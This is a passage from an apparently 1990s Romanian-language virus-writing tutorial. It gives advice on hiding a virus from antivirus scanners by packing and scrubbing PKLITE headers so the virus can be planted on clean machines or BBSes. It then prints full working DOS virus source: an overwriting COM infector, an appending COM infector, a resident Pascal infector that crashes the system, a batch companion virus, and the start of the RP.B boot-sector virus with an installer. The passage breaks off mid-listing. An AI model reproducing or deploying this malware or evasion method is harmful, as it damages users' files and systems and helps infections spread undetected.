pe seama patrunderii neautorizate intr-un sistem de gestiune impune acordarea
unor  valente  cu  totul  deosebite  tehnicilor  de  camuflaj  facind  uneori
imposibila depistarea virusului.
     Asigurarea  perioadei  de  "incubatie" se face printr-o serie de actiuni
orien-  tate  exclusiv  spre  ascunderea tuturor modificarilor intervenite in
sistem  dato-  rita  virusului. Intr-o prima etapa s-a crezut ca utilizatorul
este  singurul  care putea sesiza astfel de modificari, iar din aceasta cauza
virusul  urmarea  cu  pre-  cadere mascarea aparentelor exterioare. Un fisier
afectat  trebuie  sa-si  conserve  data crearii si a actualizarii pentru a nu
stirni  suspiciuni.  Daca  implantarea  virusului  s-a  facut  cu modificarea
dimensiunilor  fisierului  afectat,  functia  de camuflare trebuie sa asigure
interceptarea  comenzilor  de afisare a rezumatului despre fisiere, precum si
prezentarea  lungimii  initiale  a  fisierelor,  nicidecum  a celei reale. In
momentul  dezvoltarii  unor  programe specializate in depistarea virusilor si
controlul  utilizarii resurselor sistemului, virusii informatici s-au adaptat
si  acestor  restrictii. Camuflarea si deghizarea lor se faceau nu numai prin
prisma aspectelor exterioare, ci si a mecanismului intern de lucru.
     Astfel  interventiile  virusului in scopul proliferarii sau manifestarii
ac-  tiunii  distrugatoare  erau  intre cele mai scurte, pentru a nu putea fi
intercep-   tate   de   utilitare   specializate  in  afisarea  monitorizarii
resurselor.  Rezidenta  in  memorie  era  abil  accunsa, nefiind de multe ori
gestionata pe calea clasica, utilizata de celelalte programe.
     Din punctul de vedere al modului de camuflare a prezentei o clasa aparte
de  de  virusi  informatici o reprezinta virusii evolutivi. Ei sunt dotati cu
capaci-   tatea   de  a-si  modifica  esential  comportamentul  pe  parcursul
existentei lor in calculator .
     Sunt si virusi care actioneaza si in alt mod, neincercand sa se ascunda.
De  exemplu  virusul  "Mirror"  nu  se  ascunde, dar scannerul crede ca orice
program executabil este infectat.




    3. Sfaturi, pareri, etc.

    3.1. Siguranta in lucrul cu virusi

     In continuare va voi arata o modalitate de a face experimente cu virusi.
Nu  garantez  siguranta  deplina  a urmatoarei protectii dar ar trebui sa fie
luata  in considerare de cei care fac pentru prima data un virus, si chiar de
catre  avansati.  Aceasta  protectie  merge  pentru  virusii  care de exemplu
incearca  sa  strice  FAT-ul,  dar  este  ineficienta daca virusul utilizeaza
harddisk-ul  la  nivel  fizic.  Cheia  protectiei  o  constituie  comanda din
sistemul de operare: SUBST.
     Creati  un  fisier  BAT cu urmatorul continut si copiati-l pe o disketa,
apoi executati-l de pe disketa:

         @echo off
         subst d: a:\
         subst c: a:\

     Ceea  ce va face acest este de atrimite orice acces la disk-urile C: sau
D:  spre disketa, asa ca singurul disk care va fi afectat va fi disketa. Nici
un program nu poate accesa harddisk-ul cat timp este activa comanda SUBST.
     Daca  nu  vreti  sa  distrugeti o disketa de fiecare data puteti crea un
disk RAM si apoi sa redirectionati spre el accesul la harddisk.



    3.2.  Raspandirea virusilor

     O  problema  destul  de  importanta  este  raspandirea virusului pe care
tocmai  l-ati  creat.  Daca  nu  sunteti  un  programator  avansat, atunci cu
siguranta  virusul  va  fi  detectat  prin  metoda  heuristica de antivirusi.
Urmatorul sfat va va ajuta sa realizati primul pas in transmiterea virusului:
punerea  lui  pe  un  calculator curat sau intr-un BBS chiar daca fisierul ce
contine  virusul  va  fi  scanat.  Tot  ce  aveti  nevoie este PKLITE.EXE sau
LZEXE.EXE  si  un  bun  editor  hexa. Apoi comprimati fisierul cu unul dintre
aceste  utilitare.  Sa  presupunem ca ati folosit PKLITE. Daca ne uitam cu un
hexeditor in fisierul rezultat vom vedea ceva de genul urmator:

0000  4D 5A 12 01 13 00 00 00-07 00 98 05 4A A4 52 02  MZúúúúúúúúúúJúRú
0010  00 04 00 00 00 01 F0 FF-50 00 00 00 03 01 50 4B  úúúúúúúúPúúúúúPK
0020  4C 49 54 45 20 43 6F 70-72 2E 20 31 39 39 30 20  LITE Copr. 1990
0030  50 4B 57 41 52 45 20 49-6E 63 2E 20 41 6C 6C 20  PKWARE Inc. All
0040  52 69 67 68 74 73 20 52-65 73 65 72 76 65 64 00  Rights Reservedú
0050  0A 00 20 00 17 01 48 00-4A 04 4A A4 E2 03 00 40  úú úúúHúJúJúúúú@
0060  00 00 56 11 00 00 1C 00-00 00 00 00 00 00 00 00  úúVúúúúúúúúúúúúú
0070  B8 E3 07 BA 4B 02 8C DB-03 D8 3B 1E 02 00 73 1D  úúúúKúúúúú;úúúsú
0080  83 EB 20 FA 8E D3 BC 00-02 FB 83 EB 19 8E C3 53  úú úúúúúúúúúúúúS
0090  B9 C3 00 33 FF 57 BE 48-01 FC F3 A5 CB B4 09 BA  úúú3úWúHúúúúúúúú
00A0  36 01 CD 21 CD 20 4E 6F-74 20 65 6E 6F 75 67 68  6úú!ú Not enough
00B0  20 6D 65 6D 6F 72 79 24-FD 8C DB 53 83 C3 2D 03   memory$úúúSúú-ú
00C0  DA BE FE FF 8B FE 8C CD-8B C5 2B EA 8B CA D1 E1  úúúúúúúúúú+úúúúú

     Ce  este de facut? Cu hexeditorul trebuie sa acoperiti cu bytes aleatori
partea din header care contin informatii referitoare la PKLITE. Nu scrieti un
text cu semnificatie pentru ca ar da de banuit, ci pur si simplu acoperiti cu
'gunoaie'  acea  parte.  Procedati  in  acelasi fel si cu mesajul "Not enough
memory",  avand  grija  sa  nu  suprascrieti semnul "$" de dupa mesaj. Ce ati
realizat in acest fel:

   - virusul din fisierul .EXE este nedetectat de majoritatea programelor
     antivirus si a celor de tipul CHK4BOMB
   - fisierul este nedecompresabil
   - CHK4LITE nu va observa ca este un program comprimat cu PKLITE

     Pentru a mari si mai mult protectia mai comprimati odata acest fisier cu
un  alt  program  de  compresie  asemanator cu PKLITE. In mod obisnuit acesta
nu-l  va  mai  comprima  dand  un mesaj de eroare ca respectivul fisier nu se
poate  comprima.  Totusi  folositi  comanda  UNDELETE  si  refaceti  fisierul
temporar  pe  care  programul  de compresie tocmai il crease. Veti observa ca
acesta  are  lungimea mai mare decat cea a fisierului executabil obisnuit, si
tocmai  de  aceea  a  fost  sters  de  catre programul de compresie pentru ca
fisierul  original  nu  s-a putut comprima. Redenumiti acest fisier cu numele
potrivit  si  veti obtine un executabil care va fi 'imun' la toti antivirusii
cunoscuti pana acum (cine ar cauta intr-un fisier dublu-comprimat ?).



    4. Atelier. Surse de virusi

    4.1. Aplicatie practica. Realizati singur un ... virus !!!


     Va voi prezenta in continuare cativa virusi.

     Inainte  de  a  va prezenta primul virus adevarat va voi prezenta un mic
programel,  despre  care antivirusii spun ca-i tot virus. Intr-un fel ceea ce
detecteaza antivirusii este adevarat, acesta fiind o forma primitiva de virus
dar  care  poseda  toate  caracteristicile  pentru a fi incadrat in categoria
virusilor.  Pe  de  alta  parte  acest  tip de virus este practic inexistent,
datorita modului sau in care infecteaza fisierele.
     Acesta infecteaza fisierele .COM, acestea devenind irecuperabile in urma
infectiei   datorita   faptului   ca  este  suprascrisa  o  parte  din  codul
programului, fara a se mai reface mai tarziu. In momentul cand un fisier .COM
virusat  este  lansat  in executie acesta va infecta toate fisierele .COM din
directorul curent.
     Este  interesant  faptul ca TBAV face o confuzie la scanarea unui fisier
infectat, detectand acet virus sub numele de TRIVIAL.110. S-ar parea ca acest
antivirus  clasifica  in categoria TRIVIAL toti virusii cu lungimii mici care
se  manifesta  prin suprascrierea inceputului fisierelor .COM. Numarul 110 de
dupa categorie semnifica lungimea virusului.
     F-PROT  'isi  da  seama'  ca  e ceva in neregula cu fisierul infectat si
afiseaza   un   mesaj   in  care  cere  utilizatorului  sa  contacteze  firma
producatoare a acestui antivirus pentru a verifica daca aceste este virus sau
o alarma falsa.


 ----------<taie de aici in jos>---------------------------------------------

; ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÂÄÄÄ¿
; ³            VMA1 VIRUS             ³VMA³
; ³Suprapune inceputul fisierelor COM ÀÄÄÄ´
; ³Acestea vor deveni inutilizabile       ³
; ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

lungime equ ((offset sfirsit)-(offset entry))
.model tiny
.code
org 100h
entry:
      mov dx,offset mesaj        ; afiseaza mesajul virusului
      mov ah,9
      int 21h

      mov ah,4eh                 ; cauta primul fisier .COM
      mov dx,offset cale
      xor cx,cx
      int 21h
      jc retu
open:
      mov ax,3d01h               ; deschide fisierul in mod scriere
      mov dx,9eh
      int 21h
      jc retu
      push ax

      mov bx,ax                  ; copiaza virusul in fisier
      mov dx,offset entry
      mov cx,lungime
      mov ah,40h
      int 21h

      pop bx                     ; inchide fisierul pe care l-a virusat
      mov ah,3eh
      int 21h

      mov ah,4fh                 ; cauta urmatorul fisier .COM
      int 21h
      jnc open
retu:
      ret                        ; revine in sistem

mesaj db 13,10,'  --- Your computer has now VMA1 virus !!! ---',13,10,'$'
cale  db '*.COM',0
sfirsit:
end   entry

 ----------<taie de aici in sus>---------------------------------------------


     Al  doilea este un virus de tip fisier ce infecteaza .COM-urile.Deoarece
este un virus demonstrativ el nu are efect distructiv, singurul lucru care il
face  este sa afiseze un mesaj in fiecare luni.Codul sursa nu este optimizat,
dar  l-am  creat  asa  pentru  ca  incepatorii  sa  inteleaga  mai  bine (cei
cunoscatori sunt rugati sa sara la urmatorul punct).
   Obs: - TBAV 6.35 si FProt x.xx nu detecteaza acest virus !!!
        - Nici o versiune a lui TBScanX nu detecteaza acest virus !!!


 ----------<taie de aici in jos>---------------------------------------------

; ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÂÄÄÄ¿
; ³ Nume    : Virus VMA 2                                  ³VMA³
; ³ Autor   : Marian Veteanu                               ÀÄÄÄ´
; ³ Actiune : Infesteaza fisierele .COM                        ³
; ³ Efect   : Nu produce prea mari pagube !                    ³
; ³ Nota    : Acest virus l-am creat de pe vremea cand eram la ³
; ³           liceu ( liceul Nicolae Balcescu din Pitesti )    ³
; ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
; Este foarte, foarte NEoptimizat !

lungime equ ((offset sfirsit)-(offset entry))
.model tiny
.code
org 100h
entry: call entr                                ; afla in BP adresa virusului
entr   proc near
       pop bp
       sub bp,3
       mov byte ptr [cale+2-entry+bp],'C'

       mov cx,5                                 ; salveaza primii 5 bytes
       mov si,offset header-entry               ; in memorie
       add si,bp
       mov di,offset horig-entry
       add di,bp
       rep movsb

          mov ah,2ah
          int 21h
          cmp al,1                               ; afiseaza mesajul lunea
          jnz urmat
          mov ah,9
          mov dx,offset mesaj-entry
          add dx,bp
          int 21h


urmat: mov ah,1ah                               ; seteaza DTA
       mov dx,offset dta-entry
       add dx,bp
       int 21h

       mov ah,4eh                               ; cauta primul fisier .COM
       mov dx,offset cale-entry
       add dx,bp
       mov cx,2
       int 21h
       jc next

open:  mov ax,4300h                             ; salveaza atributele fis gasit
       mov dx,1eh+offset dta-entry
       add dx,bp
       int 21h
       mov atrib,cx

       mov ax,4301h                             ; sterge atributele fis gasit
       xor cx,cx
       mov dx,1eh+offset dta-entry
       add dx,bp
       int 21h

       mov ax,3d02h                             ; deschide fis in mod R/W
       mov dx,1eh+offset dta-entry
       add dx,bp
       int 21h
next:  jc next2

       mov bx,ax                                ; citeste primii 5 bytes
       mov dx,offset header-entry               ; din fisierul gasit
       add dx,bp
       mov cx,5
       mov ah,3fh
       int 21h
       jc close

       mov ax,0e2ffh                            ; verifica daca este deja virusat
       cmp word ptr [header-entry+3+bp],ax
       jz close

       mov ax,4202h                             ; afla lungimea fisierului
       xor cx,cx
       xor dx,dx
       int 21h
       jc close
       add ax,256
       mov cs:(offset hnou+1-entry)[bp],ax

       mov dx,bp                                ; scrie virusul la sfirsitul
       mov cx,lungime                           ; fisierului
       mov ah,40h
       mov byte ptr [cale+2-entry+bp],'R'
       int 21h
       jc close

       mov ax,4200h                             ; pozitioneaza pointerul
       xor cx,cx                                ; la inceputul fisierului
       xor dx,dx
       int 21h
       jc close

       mov dx,offset hnou-entry                 ; scrie 'JMP' spre virus
       add dx,bp
       mov cx,5
       mov ah,40h
       int 21h

close: mov ah,3eh                               ; inchide noul fisier virusat
       int 21h

       mov cx,atrib                             ; reface atributele fisierului
       mov ax,4301h
       mov dx,1eh+offset dta-entry
       add dx,bp
       int 21h


next2: jc retu

       mov ah,4fh                               ; cauta urmatorul fisier .COM
       int 21h
       jc retu
       jmp open


retu:  mov cx,5                                 ; reface in memorie
       mov si,offset horig-entry                ; primii 5 bytes
       add si,bp
       mov di,100h
       rep movsb
       mov dx,100h                              ; preda controlul prog. original
       push dx
       retn

cale   db '*.ROM',0
atrib  dw 0
mesaj  db 13,10,'   Your computer has now VMA2 virus !!!',13,10,'$'
header db 0C3h,0C3h,0C3h,0C3h,0C3h
hnou   db 0BAh,0,0,0FFh,0E2h                    ; mov dx,?? jmp dx
horig  db 5 dup (0)
dta    db 43 dup (0)

sfirsit:
entr   endp
end    entry

 ----------<taie de aici in sus>---------------------------------------------



     Al  treilea  virus  este  un  virus  scris  in  Pascal.  El  este foarte
rudimentar  dar  este totodata un exemplu despre cum se pot crea virusi si in
alte limbaje de programare de nivel inalt, nu numai in asamblare.



 ----------<taie de aici in jos>---------------------------------------------


{$i-}{$m 2048,0,24576}
Program RNA;
uses dos;

const blksize=8192;                     { marimea buffer-ului                }
      vsize=7200;                       { lungimea virusului                 }
      wc='*.';
      counter=blksize-1;
      cb=':\';
      maxinf:byte=4;                    { nr maxim de infectii               }
      maxruns:byte=48;
      drives:array[3..4] of char=('C','D'); { numele discurilor              }
      imf:string[12]='ux142.rqz';       { numele fisierului temporar         }


type vtype=array[1..vsize] of byte;     { tipul buffer-ului pt memorarea vir }
     buftype=array[1..blksize] of byte; { tipul buffer-ului pt operatii cu fis }

var ps:string;                          { string-ul path                     }
    s:pathstr;                          { programul curent ce ruleaza        }
    ds:dirstr;                          { directorul curent                  }
    ns:namestr;                         { fisierul programului curent        }
    es:extstr;                          { extensia programului curent        }
    v:^vtype;
    buf:^buftype;
    count,indx,inf:byte;
    attr,nr,nw:word;
    sr:searchrec;
    f,f2:file;
    t:longint;                          { pt memorarea datei si timpului fis }

procedure copyf;                        { copiaza fisierul                   }
begin
 repeat
  blockread(f,buf^,blksize,nr);
  blockwrite(f2,buf^,nr,nw);
 until (eof(f));
 close(f);
 setftime(f2,t);
 close(f2);
end;

Procedure stripf;

begin
 assign(f,s);
 reset(f,1);
 getftime(f,t);
 assign(f2,ds+imf);
 rewrite(f2,1);
 seek(f,vsize);
 copyf;
end;

procedure load;                         { incarca virusul din fisier         }

begin
 assign(f,s);
 getfattr(f,attr);
 reset(f,1);
 if ioresult=0 then
  begin
   getftime(f,t);                       { obtinerea datei si timpului        }
   blockread(f,v^,vsize,nr);
   count:=v^[vsize]-1;

   v^[vsize]:=maxruns;
   seek(f,vsize-1);
   blockwrite(f,count,1,nr);
   setftime(f,t);
   close(f);
   setfattr(f,attr);
  end;
end;

function checkf(pth:dirstr):boolean;    { verifica daca este deja infectat   }

var by:array[1..27] of byte;

begin
 checkf:=false;
 if pos(sr.name,'COMMAND.COM')=0 then   { sa nu infecteze COMMAND.COM        }
 begin
  assign(f,pth+sr.name);
  reset(f,1);
  if ioresult=0 then
   begin
    blockread(f,by,27,nr);
    for indx:=1 to 27 do
     if (by[indx])<>(v^[indx]) then
      checkf:=true;
    close(f);
   end;
 end;
end;

procedure attach(pth:dirstr);           { ataseaza virusul la incepultul fis }
begin
 inc(inf);
 assign(f2,pth+'zSqA.th');              { creaza fisierul temporar           }
 rewrite(f2,1);
 if ioresult=0 then
  begin
   assign(f,pth+sr.name);
   getfattr(f,attr);
   reset(f,1);
   getftime(f,t);
   blockwrite(f2,v^,vsize,nr);
   copyf;
   erase(f);
   rename(f2,sr.name);
   setfattr(f2,attr);
  end;
end;

procedure rep(pth:dirstr;ext:extstr);

begin
 findfirst(pth+wc+ext,hidden+archive+readonly,sr);
 while (inf<maxinf) and (doserror=0) do { cauta fisiere pt infectare         }
  begin
   if checkf(pth) then attach(pth);
   findnext(sr);
  end;
end;

procedure wastetime;interrupt;          { handler-ul pt intreruperea 1Ch     }
begin
 inc(t);
 inline($90/$90/$90/$90/$90/$90);       { NOP NOP NOP NOP NOP NOP            }
 if ((t mod 8640)=8639) then inline($4C); { crash dupa cca 8 minute          }
end;

procedure replicate;

var tmp:dirstr;

begin
 while (ps<>'') do
  begin
   indx:=pos(';',ps);
   if indx=0 then
    begin
     tmp:=ps;
     ps:='';
    end
   else
    begin
     tmp:=copy(ps,1,indx-1);
     ps:=copy(ps,indx+1,length(ps)-indx);
    end;
   if tmp[length(tmp)]<>'\' then tmp:=tmp+'\';

   rep(tmp,'cOm');                              { infecteaza *.COM           }
   rep(tmp,'exE');                              { infecteaza *.EXE           }
  end;
end;

procedure makep;

var b:byte;

begin
 getdir(0,ps);                                  { obtine drive-ul curent     }
 for b:=3 to 4 do
  begin
   ps:=ps+';'+drives[b]+cb+';';
   findfirst(drives[b]+cb+wc,directory,sr);
   while (doserror=0) and (length(ps)<240) do
    begin
     ps:=ps+drives[b]+cb+sr.name+';';
     findnext(sr);
    end;
  end;
end;

procedure grow;

begin
 inf:=0;                        { reseteaza contorul de infectii             }
 ps:=getenv('path');
 if ps<>'' then replicate;
 if inf<maxinf then
  begin
   makep;
   replicate;
  end;
end;

procedure remove;               { routina de dezinfectie                     }
begin
 assign(f,s);
 erase(f);
 assign(f,ds+imf);
 rename(f,ns+es);
end;

procedure runf;                 { ruleaza fisierul original                  }
begin
 exec(ds+imf,paramstr(1)+paramstr(2)+paramstr(3));
 assign(f,ds+imf);
 erase(f);
end;

begin
 new(v);
 new(buf);
 s:=paramstr(0);
 fsplit(s,ds,ns,es);
 stripf;
 load;
 grow;
 if count=0 then remove;
 runf;
 if count<3 then
  begin
   t:=0;
   setintvec($1c,@wastetime);
   keep(0);                       { ramane rezident                          }
  end;
end.


 ----------<taie de aici in sus>---------------------------------------------


     Al  patrulea este un virus de tip .BAT. El "infecteaza" fisierele de tip
.COM si .EXE. Nu are nici un efect distructiv. OBS: TBAV 7.07 si F-PROT 2.24c
nu detecteaza acest virus.


 ----------<taie de aici in jos>---------------------------------------------


@Echo Off
REM ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
REM ³  Acesta este un virus demonstrativ produs de VMA  ³
REM ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
ctty nul
for %%f in (*.exe *.com) do set VMAViru=%%f
rename %VMAViru% V%VMAViru%
attrib +h V%VMAViru%
copy %0.bat %VMAViru%
rename %VMAViru% *.bat
set VMAViru=
ctty con
if errorlevel==1 goto Display
goto EndVirus
:Display
@echo off
echo.
echo Your system was infected by VMA Virus !
echo Don't pannic ! Just use : FORMAT C:/U
echo.
:EndVirus
@if exist V%0.COM V%0 %1 %2 %3 %4 %5 %6 %7 %8 %9
@if exist V%0.EXE V%0 %1 %2 %3 %4 %5 %6 %7 %8 %9


 ----------<taie de aici in sus>---------------------------------------------


    4.2. Aplicatie practica. Studiul unor virusi foarte raspanditi

    Va voi prezenta in continuare un studiu asupra mai multor virusi destul
de raspanditi in Romania. Pentru exemplificare voi da exemple de secvente
de cod viral sau chiar sursa completa a unora dintre ei.

     ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
     ³Virusul "STONE"³
     ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

     Unul  dintre  primii virusi pe care am avut ocazia sa-i capturez si apoi
sa-i  studiez  a  fost si virusul STONE. Acest virus mai este cunoscut si sub
denumirile  de  STONED, HAMP, MARIJUANA, NEW-ZEA-LAND, HAWAII si SMITHSONIAN.
Ca  la  majoritatea programeleor si acest virus are mai multe versiuni ,ca de
exemplu STONED II, STONED III.
     Este   un  virus  de  boot,  care  infecteaza  sectoarele  de  boot  ale
dischetelor si tabelele de partitii ale hard-disk-urilor. Lungimea sa este de
512  bytes  si  ramane  rezident  in  memorie.Deoarece  patrunde in tabela de
partitii  acest  virus  NU  este  scos  prin formatarea obisnuita a partitiei
respective cu comanda "FORMAT".
     Antivirusul  Scan3.7v64. detine urmatoarele informatii pentru detectarea
acestui virus:
    Stoned-II Virus [S-2] -- Semnatura: 0x9c 0x2e 0xff 0x1e 0x09 0x00
    Stoned Virus [Stoned] -- Semnatura: 0x00 0x53 0x51 0x52 0x06 0x56 0x57 0xbe
     Aceste  informatii  au  fost  obtinute  decodificand  fisierul  in  care
antivirusul amintit pastreaza date referitoare la virusii cunoscuti.

     ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
     ³Virusul "PING-PONG"³
     ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

     Este  un  virus  de  boot  care  afecteaza dischetele si harddisk-urile.
Lungimea   sa   este  de  1024  de  bytes  si  ramane  rezident  in  memorie.
"Semnatura"  sa  este  7D807426BEBE81B90400807C0401740C807C04047406. Mai este
cunoscut  si  sub  denumirile  :  ITALIAN,  BOUNCING  BALL  si FOUNCINGDOT. O
versiune  a  acestuia pentru AT-uri este cunoscuta sub denumirea de PING-PONG
286. Iata in continuare un fragment din prima parte a acestui virus:
    ...
    xor ax , ax
    mov ss , ax
    mov sp , 7c00h
    mov ds , ax
    mov ax , [413h]
    sub ax , 2
    mov [413h] , ax

    mov cl , 6
    shl ax , cl
    sub ax , 07c0h

    mov es , ax
    mov si , 7c00h
    mov di , si
    mov cx , 100h
    rep movsw

    mov cs , ax
    push cs
    pop ds
    ...
     Dupa cum se vede din acest fragment virusul se autocopiaza in ultimii 2K
de  memorie  RAM raportata de BIOS ( adresa [0:413h] contine numarul de Kb ),
dupa  care  scade  din nr de Kb pe 2 si inscrie la aceiasi adresa noul numar.
Practic  virusul  isi rezerva 2K de memorie in care sistemul de operare nu va
mai  avea  acces.Deoarece este un virus de boot, el se afla initial la adresa
0:7c00h,  de  unde se va copia in noua zona de memorie. Iata cum face virusul
calculul adresei:
     Sa presupunem ca un virus se afla initial la adresa seg1:ofs1 si trebuie
copiat  in  ultimii  n KB de memorie RAM. Noua adresa seg2:ofs1 se calculeaza
din formula:
    16*seg2+ofs1=(N-n)*1024 => seg2=(N-n)*64-trunc(ofs1/16) ,
                   unde:
                     N=nr de Kb memorie RAM raportati de BIOS
                     n=ultimii KB de memorie RAM ce vor fi rezervati.
    In cazul lui PING-PONG :
    seg2=(N-2)*64-trunc(7c00h/16)=(N-2)*64-07C0h=(N-2)*2^6-07C0h


     ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
     ³Virusul "RP.B"³
     ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

     Iata  in  continuare  aplicat in practica acest lucru. Urmatorul listing
este  sursa  completa  de  la  virusul RP.B. Acesta este un virus romanesc cu
efecte  nedistructive.  Singurul  lucru  prin  care  isi  face  aparitia este
afisarea  pe  ecran  in  luna  mai a unui mesaj. Observati cum acest virus se
autocopiaza  in  ultimul  KByte  de RAM. Informatii suplimentare despre acest
virus  gasiti  in  comentariile  din  sursa.  Pentru asamblarea acestui virus
procedati in felul urmator:
    - copiati virusul in fisierul: RPBVIRUS.ASM
    - dati comanda : TASM RPBVIRUS.ASM
    - dati comanda : TLINK RPBVIRUS.OBJ /t
     Va  rezulta  un  fisier  .COM. La rularea acestuia veti fi intrebat daca
doriti  sa  instalati  virusul.  Daca  raspundeti afirmativ atunci trebuie sa
introduceti o disketa in unitatea A:
     OBS: Acest virus nu este recunoscut de TBAV 7.07 dar este recunoscut
          de F-PROT 2.24c

 ----------<taie de aici in jos>---------------------------------------------

; ÚÄÄÄÄÄÄÄÄÄÄÄÄ¿ ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿ ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
; ³ RP.B Virus ÆÍµ Dezasamblat de : VMA soft ÆÍµ 01 Mai 1997, Pitesti, RO ³
; ÀÄÄÄÄÄÄÄÄÄÄÄÄÙ ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
;
; RP.B este un virus romnesc care isi face aparitia vizuala in luna Mai.
; Daca luna curenta este luna mai el afiseaza in bucla infinita urmatorul
; mesaj :  "Only bugs exist! RP 1995 Bucharest" neproducand infectii.
; Daca nu este luna mai atunci el infecteaza sectoarele de boot ale disktelor
; si tabela de partitii a harddiskului.
; Sectoarul original cu tabela de partitii este copiat pe sectorul fizic 14,
; fata 0, cilindrul 0 la hardiskuri sau pe sectorul fizic 14, fata 1, cil. 0
; la diskete cu MediaByte=0F0h sau pe sectorul 3 la diskete cu MediaByte<>0F0h
; In mod normal la hardisk acest sector este nefolosit iar la disketele ce au
; MediaByte=0F0h acest sector reprezinta sectorul logic 31, adica penultimul
; sector din ROOT (de obicei ROOT-ul are 14 sectoare).
; Virusul se autocopiaza in ultimul KByte de RAM raportat de BIOS si instaleaza
; rutine noi pentru tratarea intreruperilor 13h si 12h.
; Se foloseste un contor care memoreaza de cate ori a fost accesata INT 13H
; in alte scopuri decat pentru a citi MBR-ul sau BOOT-ul. Daca acest contor
; ajunge la 90 atunci INT 12H va returna 640K de memorie. Contorul devine 0
; daca se acceseaza MBR-ul sau BOOT-ul unei dischete.
; OBS: Acest program de instalare a virusului pe disketa nu copiaza sec0 in
; sec31, de aceea la boot-area de pe aceasta disketa veti primi probabil un
; mesaj de eroare din partea BIOS-ului. Urmatoarele diskete ce se vor accesa
; cat si harddiskul vor beneficia de o virusare 'corecta'.

.model tiny
.code
org 100h
entry:

;  =================================================
;  Partea asta copiaza sectorul de BOOT pe discul A:
;  In felul acesta se instaleaza virusul RP in BOOT
;  =================================================

            lea     si, mes1
            call    AfisTxt    ; se afiseaza mesajul introductiv

get_y_n:
            mov     ah,8       ; verifica daca se doreste instalarea virusului
            int     21h
            cmp     al,'D'
            jz      yes
            cmp     al,'d'
            jz      yes
            cmp     al,'N'
            jz      no
            cmp     al,'n'
            jz      no
            jmp     get_y_n

yes:        xor     al,al      ; al = 0 - Discul A:
            mov     cx,1       ; cx = 1 - Numarul de sectoare de scris
            xor     dx,dx      ; dx = 0 - Sectorul de BOOT
            push    ds
            lea     bx,RPVirus
            int     26h        ; scrie 512 bytes de la adresa ds:[bx]
            pop     ax         ; scot byte-ul ramas aiurea pe stiva
            pop     ds
            jc      _Cont1
            lea     si, mes2
            call    AfisTxt
            xor     al,al            ; Se returneaza 0 pentru instalare normala
            jmp     short _Cont2
_Cont1:     lea     si, mes3
            call    AfisTxt
            mov     al,1             ; Se returneaza 1 pentru eroare la scriere pe discul A:
_Cont2:     mov     ah,4Ch
            int     21h

No:         lea     si, mes4
            call    AfisTxt
            mov     al,2             ; Se returneaza 2 pentru program intrerupt de utilizator
            jmp     short _Cont2

mes1:       db 'VMA RPVirus Installer . Versiunea 1.0 (c) VMA software', 0Ah, 0Dh
            db 'Doriti sa instalati virusul in sectorul de BOOT A: (D/N) ?',0Ah, 0Dh, 0
mes2:       db 'Sectorul de BOOT de pe discul A: a fost inlocuit cu succes.', 0Ah, 0Dh,0
mes3:       db 'Eroare la scriere pe discul A:', 0Ah, 0Dh,0
mes4:       db 'Program intrerupt de utilizator! Virusul nu s-a instalat !', 0Ah, 0Dh,0

;  =========================                ; afiseaza sirul ASCIIZ de la
;   Subrutina pentru afisat                 ; adresa ds:[si]
;  =========================

AfisTxt     proc    near
            cld
Next1:
            lodsb                           ; String ds:[si] -> al
            or      al,al                   ; Zero ?
            jnz     Next2                   ; Jump daca nu
            retn
Next2:
            push    si
            mov     ah,0Eh
            int     10h
            pop     si

            jmp     short Next1
AfisTxt     endp


;  ===================================
;  Aici incepe codul pentru virusul RP
;  ===================================

RPVirus      proc    near
FixPoint     equ     7C00h
ProgBegin    equ     $
NewInt13hHan equ     FixPoint+(offset NewInt13h)-ProgBegin
NewInt12hHan equ     FixPoint+(offset NewInt12h)-ProgBegin
Old13hVec    equ     FixPoint+(offset Old13h)-ProgBegin
Old12hVec    equ     FixPoint+(offset Old12h)-ProgBegin
BOOTHdr      equ     Fixpoint+(offset hdr)-ProgBegin
MBRecord     equ     FixPoint+(offset mesaj1)-ProgBegin
ContorNoRead equ     FixPoint+(offset Contor)-ProgBegin
MesajLunaMai equ     FixPoint+(offset mesajmai)-ProgBegin

            jmp     short start
            nop

Hdr:        db 'MSDOS5.0'      ; 8 bytes - Numele si versiune SO
            dw 512             ; Dimensiunea sectorului in octeti
            db 1               ; Numarul de sectoare/cluster
            dw 1               ; Sectoare ocupate pana la prima copie FAT
            db 2               ; Numarul de copii FAT
            dw 224             ; Numarul intrarilor in directorul radacina : 224*32/512=14 sectoare ocupate de ROOT
